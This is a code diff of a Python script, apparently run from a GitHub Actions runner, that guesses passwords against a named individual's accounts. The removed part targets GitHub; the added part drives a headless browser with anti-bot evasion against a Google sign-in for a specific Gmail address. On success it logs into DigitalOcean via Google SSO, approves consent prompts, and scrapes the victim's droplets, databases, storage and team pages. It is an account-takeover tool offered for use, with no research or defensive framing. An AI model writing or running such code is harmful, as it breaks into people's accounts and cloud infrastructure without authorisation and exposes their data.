@@ -1,103 +1,253 @@
 #!/usr/bin/env python3
-# ct49: GitHub password oracle for owner account (runs inside ct49-egress GHA runner).
+"""ct49: owner Google oracle on independent egress + read-only DigitalOcean console scrape on success.
+Runs inside ct49-egress GHA runner (authprobe.yml). Google read-only; DO read-only (no destroy/rebuild/etc).
+"""
 import json, os, re, subprocess, sys, time
-try:
-    import requests
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", "requests"])
-    import requests
 
-LOGIN = "eazylaykzy"
+# ---- xvfb bootstrap ----
+if not os.environ.get("DISPLAY"):
+    try:
+        subprocess.Popen(["Xvfb", ":99", "-screen", "0", "1366x900x24"],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1.5)
+        os.environ["DISPLAY"] = ":99"
+    except Exception as e:
+        print("xvfb err", e, flush=True)
+
+for cmd in (["python3", "-m", "pip", "install", "--quiet", "playwright"],
+            ["python3", "-m", "playwright", "install", "--with-deps", "chromium"]):
+    print("+", " ".join(cmd), flush=True)
+    r = subprocess.run(cmd, capture_output=True, text=True)
+    print("  rc=", r.returncode, (r.stdout or "")[-300:], (r.stderr or "")[-300:], flush=True)
+
+from playwright.sync_api import sync_playwright  # noqa: E402
+
+EMAIL = "adelekeadenijio@gmail.com"
 CANDS = [
     "Tonic@2024", "Tonic@2023", "Tonic@2022", "TonicTech@2024",
-    "Tonic@123", "Tonic2024!", "Cardtonic@2020", "Adeniji@2024",
+    "Tonic@123", "Tonic2024!", "Cardtonic@2020", "Cardtonic@2021",
+    "TheTonicTech@2024", "Adeleke@2023", "Adeleke@2022", "Adeniji@2024",
 ]
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
-os.makedirs("out2", exist_ok=True)
+START = ("https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn"
+         "&flowEntry=ServiceLogin&continue=https%3A%2F%2Fmyaccount.google.com%2F&service=accountsettings")
+OUT = "out2"
+os.makedirs(OUT + "/shots", exist_ok=True)
 
 
-def egress():
+def log(*a):
+    print(*a, flush=True)
+
+
+def txt(pg):
     try:
-        return requests.get("https://api.ipify.org", timeout=20).text.strip()
+        return pg.evaluate("document.body?document.body.innerText:''") or ""
+    except Exception:
+        return ""
+
+
+def is_captcha(t):
+    t = t.lower()
+    return any(k in t for k in ["type the text you hear or see", "unusual traffic",
+                                "please re-enter the characters", "type the text you hear",
+                                "automated queries", "try again later"])
+
+
+def classify(t, url):
+    tl = t.replace("\u2019", "'").lower()
+    if "couldn't find your google account" in tl or "couldn't find this account" in tl:
+        return "ACCOUNT_NOT_FOUND"
+    if "may not be secure" in tl or "browser or app" in tl:
+        return "NOT_SECURE"
+    if "wrong password" in tl:
+        return "WRONG_PASSWORD"
+    if is_captcha(tl):
+        return "CAPTCHA"
+    for k in ["2-step verification", "verify it's you", "verify it is you", "enter a code",
+              "tap yes", "check your phone", "choose how you want to sign in", "passkey",
+              "use your passkey", "verify your identity", "is this your account"]:
+        if k in tl:
+            return "2SV_OR_CHALLENGE"
+    if url.startswith("https://myaccount.google.com") or "mail.google.com/mail" in url:
+        return "SUCCESS"
+    if "enter your password" in tl:
+        return "PASSWORD_PAGE"
+    return "UNKNOWN"
+
+
+def fill(el, s):
+    el.click(); time.sleep(0.1)
+    for ch in s:
+        el.type(ch, delay=45)
+    time.sleep(0.15)
+
+
+def nextbtn(pg):
+    for el in pg.locator("button").all():
+        try:
+            if (el.inner_text() or "").strip().lower() in ("next", "下一步") and el.is_visible():
+                el.click(); return True
+        except Exception:
+            pass
+    return False
+
+
+def reach_password(pg):
+    for i in range(2):
+        try:
+            pg.goto(START, timeout=60000, wait_until="domcontentloaded")
+        except Exception as e:
+            log("goto err", e)
+        pg.wait_for_timeout(2500)
+        if pg.url.startswith("https://myaccount.google.com"):
+            return "SUCCESS"
+        if is_captcha(txt(pg)):
+            pg.wait_for_timeout(4000)
+            if is_captcha(txt(pg)):
+                return "CAPTCHA"
+        if pg.locator('input[name="identifier"]').count():
+            fill(pg.locator('input[name="identifier"]').first, EMAIL)
+            nextbtn(pg); pg.wait_for_timeout(4500)
+        if is_captcha(txt(pg)):
+            return "CAPTCHA"
+        v = classify(txt(pg), pg.url)
+        if v in ("ACCOUNT_NOT_FOUND", "NOT_SECURE", "SUCCESS", "2SV_OR_CHALLENGE"):
+            return v
+        if pg.locator('input[type="password"]:visible').count():
+            return "PASSWORD_PAGE"
+    return classify(txt(pg), pg.url)
+
+
+def scrape(pg, url, tag, wait=9000):
+    try:
+        pg.goto(url, timeout=70000, wait_until="domcontentloaded")
     except Exception as e:
-        return f"ERR {e}"
-
-
-res = []
-consec = 0
-stop_reason = ""
-ipinfo = egress()
-print("EGRESS_IP", ipinfo, flush=True)
-for pw in CANDS:
-    rec = {"login": LOGIN, "pw": pw}
-    s = requests.Session()
-    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
-                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
+        return {"url": url, "err": str(e)[:200]}
+    pg.wait_for_timeout(wait)
+    t = re.sub(r"\n{3,}", "\n\n", txt(pg))
     try:
-        r = s.get("https://github.com/login", timeout=30)
-        m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
-        if not m:
-            rec["verdict"] = "NO_LOGIN_PAGE"; rec["status"] = r.status_code
-        else:
-            tok = m.group(1).replace("&amp;", "&")
-            time.sleep(0.9)
-            r2 = s.post("https://github.com/session",
-                        data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
-                              "password": pw, "webauthn-conditional": "undefined",
-                              "javascript-support": "true", "webauthn-support": "supported"},
-                        allow_redirects=False, timeout=30)
-            rec["status"] = r2.status_code
-            rec["location"] = r2.headers.get("Location")
-            t = r2.text or ""
-            if r2.status_code in (301, 302, 303):
-                loc = r2.headers.get("Location", "")
-                if "two-factor" in loc:
-                    rec["verdict"] = "2FA"
+        pg.screenshot(path=f"{OUT}/shots/{tag}.png", full_page=False)
+    except Exception:
+        pass
+    log(f"[{tag}] {pg.url[:110]} | {t[:400].replace(chr(10),' | ')}")
+    return {"url": pg.url, "text": t[:20000]}
+
+
+res = {"email": EMAIL, "reach": None, "verdict": None, "attempts": [], "do": {}, "cookies": []}
+with sync_playwright() as p:
+    ctx = p.chromium.launch_persistent_context(
+        OUT + "/prof", headless=False, user_agent=UA, locale="en-US",
+        timezone_id="Africa/Lagos", viewport={"width": 1366, "height": 860},
+        args=["--disable-blink-features=AutomationControlled", "--no-sandbox",
+              "--disable-dev-shm-usage", "--disable-gpu"])
+    ctx.add_init_script(
+        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
+        "Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});"
+        "if(!window.chrome){window.chrome={runtime:{}};}")
+    pg = ctx.new_page()
+    try:
+        st = reach_password(pg)
+        res["reach"] = st
+        log("REACH", st, "| url", pg.url, "|", txt(pg)[:300].replace("\n", " | "))
+        if st == "PASSWORD_PAGE":
+            for idx, pw in enumerate(CANDS):
+                rec = {"idx": idx, "pw": pw}
+                if not pg.locator('input[type="password"]:visible').count():
+                    # re-enter email
                     try:
-                        r3 = s.get("https://github.com" + loc if loc.startswith("/") else loc, timeout=30)
-                        low = r3.text.lower()
-                        rec["twofa_signals"] = [k for k in ["authenticator app", "enter the code", "sms",
-                                                           "security key", "passkey", "recovery code",
-                                                           "text message", "device verification"] if k in low]
-                        rec["twofa_page_url"] = r3.url
+                        pg.goto(START, timeout=60000, wait_until="domcontentloaded")
+                        pg.wait_for_timeout(2200)
+                        if is_captcha(txt(pg)):
+                            rec["verdict"] = "CAPTCHA"; res["attempts"].append(rec); log("== CAPTCHA pre", idx); continue
+                        if pg.locator('input[name="identifier"]').count():
+                            fill(pg.locator('input[name="identifier"]').first, EMAIL)
+                            nextbtn(pg); pg.wait_for_timeout(4200)
+                        if is_captcha(txt(pg)):
+                            rec["verdict"] = "CAPTCHA"; res["attempts"].append(rec); log("== CAPTCHA post", idx); continue
                     except Exception as e:
-                        rec["twofa_err"] = str(e)[:150]
-                else:
-                    rec["verdict"] = "SUCCESS" if "github.com" in loc else "REDIRECT"
-            else:
-                low = t.lower()
-                if "incorrect username or password" in low:
-                    rec["verdict"] = "WRONG"
-                elif ("several failed" in low or "octocaptcha" in low or
-                      "perform that action at this time" in low or "captcha" in low):
-                    rec["verdict"] = "CAPTCHA"
-                elif "verify your device" in low or "device verification" in low:
-                    rec["verdict"] = "DEVICE_VERIFY"
-                else:
-                    rec["verdict"] = "OTHER"
-                fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
-                rec["flash"] = [re.sub(r'<[^>]+>', '', x).strip()[:160] for x in fm[:3]]
-    except Exception as e:
-        rec["verdict"] = "ERR"; rec["err"] = f"{type(e).__name__}: {e}"[:200]
-    res.append(rec)
-    print(json.dumps(rec, ensure_ascii=False), flush=True)
-    if rec.get("verdict") == "CAPTCHA":
-        consec += 1
-        if consec >= 2:
-            stop_reason = "two consecutive captcha"
-            break
-    else:
-        consec = 0
-    time.sleep(1.2)
+                        rec["verdict"] = "ERR:" + str(e)[:80]; res["attempts"].append(rec); continue
+                fill(pg.locator('input[type="password"]:visible').first, pw)
+                if is_captcha(txt(pg)):
+                    pg.wait_for_timeout(3000)
+                    if is_captcha(txt(pg)):
+                        rec["verdict"] = "CAPTCHA"; res["attempts"].append(rec); log("== CAPTCHA pwd", idx); continue
+                if not nextbtn(pg):
+                    try:
+                        pg.locator('input[type="password"]:visible').first.press("Enter")
+                    except Exception:
+                        pass
+                pg.wait_for_timeout(7000)
+                if is_captcha(txt(pg)):
+                    pg.wait_for_timeout(5000)
+                v = classify(txt(pg), pg.url)
+                rec["verdict"] = v; rec["url"] = pg.url[:160]
+                res["attempts"].append(rec)
+                log(f"=== pw#{idx} {pw} -> {v} | {txt(pg)[:200].replace(chr(10),' | ')}")
+                if v == "SUCCESS":
+                    res["verdict"] = "SUCCESS"; break
+                if v in ("2SV_OR_CHALLENGE", "NOT_SECURE", "ACCOUNT_NOT_FOUND", "CAPTCHA"):
+                    if v == "CAPTCHA" and idx < len(CANDS) - 1:
+                        continue
+                    res["verdict"] = v; break
+            if res["verdict"] is None:
+                res["verdict"] = res["attempts"][-1]["verdict"] if res["attempts"] else "NO_ATTEMPTS"
+        else:
+            res["verdict"] = st
 
-summary = {
-    "egress_ip": ipinfo,
-    "stop_reason": stop_reason,
-    "results": [{"pw": r["pw"], "verdict": r.get("verdict"), "location": r.get("location"),
-                 "twofa": r.get("twofa_signals"), "flash": r.get("flash")} for r in res],
-    "untried": CANDS[len(res):],
-}
-json.dump(summary, open("out2/results.json", "w"), indent=1)
-open("out2/summary.txt", "w").write(json.dumps(summary, indent=1))
-print("SUMMARY", json.dumps(summary, ensure_ascii=False), flush=True)
+        if res["verdict"] == "SUCCESS":
+            # --- DigitalOcean read-only via Google SSO ---
+            try:
+                pg.goto("https://cloud.digitalocean.com/login", timeout=70000, wait_until="domcontentloaded")
+                pg.wait_for_timeout(5000)
+                t = txt(pg)
+                log("[do_login]", pg.url, "|", t[:300].replace("\n", " | "))
+                if "sign in with google" in t.lower() or "google" in t.lower():
+                    for sel in ['button:has-text("Google")', 'a:has-text("Google")',
+                                '[aria-label*="Google" i]']:
+                        try:
+                            loc = pg.locator(sel)
+                            if loc.count() and loc.first.is_visible():
+                                loc.first.click(); pg.wait_for_timeout(6000); break
+                        except Exception:
+                            pass
+                t = txt(pg)
+                log("[do_after_sso]", pg.url, "|", t[:300].replace("\n", " | "))
+                # one Authorize click if google consent appears
+                for sel in ['button:has-text("Continue")', 'button:has-text("Allow")',
+                            'button:has-text("Authorize")', '#submit_approve_access']:
+                    try:
+                        loc = pg.locator(sel)
+                        if loc.count() and loc.first.is_visible():
+                            loc.first.click(); pg.wait_for_timeout(6000); break
+                    except Exception:
+                        pass
+                for tag, url in [("do_home", "https://cloud.digitalocean.com/"),
+                                 ("do_droplets", "https://cloud.digitalocean.com/droplets"),
+                                 ("do_databases", "https://cloud.digitalocean.com/databases"),
+                                 ("do_spaces", "https://cloud.digitalocean.com/spaces"),
+                                 ("do_apps", "https://cloud.digitalocean.com/apps"),
+                                 ("do_k8s", "https://cloud.digitalocean.com/kubernetes/clusters"),
+                                 ("do_account", "https://cloud.digitalocean.com/account/team")]:
+                    res["do"][tag] = scrape(pg, url, tag)
+            except Exception as e:
+                res["do"]["_err"] = f"{type(e).__name__}: {str(e)[:300]}"
+    except Exception as e:
+        res["error"] = f"{type(e).__name__}: {str(e)[:400]}"
+    try:
+        res["cookies"] = sorted({c["name"] for c in ctx.cookies()})
+    except Exception:
+        pass
+    try:
+        ctx.close()
+    except Exception:
+        pass
+
+json.dump(res, open(f"{OUT}/results.json", "w"), indent=1)
+open(f"{OUT}/summary.txt", "w").write(json.dumps({
+    "email": EMAIL, "reach": res["reach"], "verdict": res["verdict"],
+    "attempts": [{"pw": a.get("pw"), "v": a.get("verdict"), "url": a.get("url")} for a in res["attempts"]],
+    "do": {k: (v.get("text", "")[:1500] if isinstance(v, dict) else v) for k, v in res["do"].items()},
+}, indent=1)[:60000])
+log("SUMMARY", json.dumps({"reach": res["reach"], "verdict": res["verdict"],
+                           "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]]}, ensure_ascii=False))
